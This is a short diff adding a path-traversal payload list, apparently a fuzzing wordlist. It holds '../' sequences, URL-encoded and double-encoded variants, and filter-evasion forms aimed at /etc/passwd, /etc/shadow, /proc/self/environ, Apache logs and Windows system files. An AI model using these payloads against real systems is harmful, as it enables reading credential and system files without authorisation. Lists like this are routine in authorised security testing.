@@ -1,0 +1,15 @@
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../etc/hosts
+../../../../../../proc/self/environ
+../../../../../../var/log/apache2/access.log
+../../../../../../Windows/system.ini
+../../../../../../Windows/win.ini
+../../../../../../C:/Windows/system32/drivers/etc/hosts
+../../*/file
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+C:\Windows\system32\drivers\etc\hosts
+C:/Windows/system32/drivers/etc/hosts
